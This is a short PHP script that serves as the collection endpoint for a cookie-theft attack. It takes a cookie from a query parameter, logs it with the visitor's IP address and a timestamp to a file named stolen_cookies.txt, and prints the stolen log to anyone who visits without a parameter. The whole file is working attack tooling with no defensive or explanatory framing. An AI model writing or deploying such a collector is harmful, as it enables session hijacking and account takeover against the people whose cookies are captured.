<?php
$logFile = __DIR__ . '/stolen_cookies.txt';

if (isset($_GET['c'])) {
    $cookie = $_GET['c'];
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $time = date('Y-m-d H:i:s');
    $logLine = "[{$time}] IP: {$ip} | Cookie: {$cookie}\n";
    file_put_contents($logFile, $logLine, FILE_APPEND | LOCK_EX);
    echo "OK";
} else {
    if (is_file($logFile)) {
        header('Content-Type: text/plain');
        readfile($logFile);
    } else {
        echo "No cookies stolen yet.\n";
    }
}
